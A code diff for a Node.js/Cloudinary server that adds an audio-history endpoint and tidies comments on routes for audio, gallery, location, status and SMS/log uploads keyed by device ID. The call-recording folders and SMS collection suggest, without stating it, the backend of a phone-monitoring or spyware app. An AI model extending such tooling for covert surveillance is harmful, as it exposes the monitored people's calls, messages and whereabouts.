@@ -91,7 +91,7 @@ io.on('connection', (socket) => {
 });
 
 app.get('/', (req, res) => {
-    res.send('✅ Server Running: Audio Upload Added + Limits Adjusted!');
+    res.send('✅ Server Running: Audio History API Added!');
 });
 
 // ==================================================
@@ -118,7 +118,9 @@ app.post('/api/upload-image', (req, res) => {
     );
 });
 
-// ✅✅ NEW: AUDIO UPLOAD ROUTE ADDED HERE ✅✅
+// ==================================================
+//  ✅ AUDIO UPLOAD (Saves to Cloudinary)
+// ==================================================
 app.post('/api/upload-audio', (req, res) => {
     let { device_id, audio_data, filename } = req.body; 
     
@@ -151,7 +153,29 @@ app.post('/api/upload-audio', (req, res) => {
     );
 });
 
-// ✅ Gallery List Limit Increased to 100 per page for faster loading
+// ==================================================
+//  🔥 NEW: GET AUDIO HISTORY (Fix for Dashboard)
+// ==================================================
+app.get('/api/audio-history/:device_id', async (req, res) => {
+    const id = req.params.device_id.trim().toUpperCase();
+    
+    try {
+        // Cloudinary search API
+        // Hum 'video' type dhoond rahe hain kyunki upload 'video' type me hua tha
+        const result = await cloudinary.search
+            .expression(`folder:${id}/calls AND resource_type:video`) 
+            .sort_by('created_at', 'desc')
+            .max_results(50)
+            .execute();
+
+        res.json(result.resources);
+    } catch (error) {
+        console.error("❌ History Error:", error);
+        res.json([]); // Error aane par empty list bhejo
+    }
+});
+
+// ✅ Gallery List
 app.get('/api/gallery-list/:device_id', (req, res) => {
     const id = req.params.device_id.toUpperCase();
     const next_cursor = req.query.next_cursor || null;
@@ -159,7 +183,7 @@ app.get('/api/gallery-list/:device_id', (req, res) => {
     cloudinary.api.resources({ 
         type: 'upload', 
         prefix: id + "/", 
-        max_results: 100, // 🔥 Limit badha di hai (Pehle 20 thi)
+        max_results: 100, 
         next_cursor: next_cursor, 
         direction: 'desc', 
         context: true 
@@ -172,7 +196,7 @@ app.get('/api/gallery-list/:device_id', (req, res) => {
 });
 
 // ==================================================
-//  🔥 STATUS & LOCATION ACCURACY UPDATE
+//  🔥 STATUS & LOCATION
 // ==================================================
 
 app.get('/api/admin/all-devices', (req, res) => {
@@ -222,7 +246,7 @@ app.post('/api/status', (req, res) => {
 });
 
 // ==================================================
-//  🔥 DATA STORAGE
+//  🔥 DATA STORAGE (Logs, SMS, etc.)
 // ==================================================
 
 app.post('/api/upload_data', async (req, res) => { 
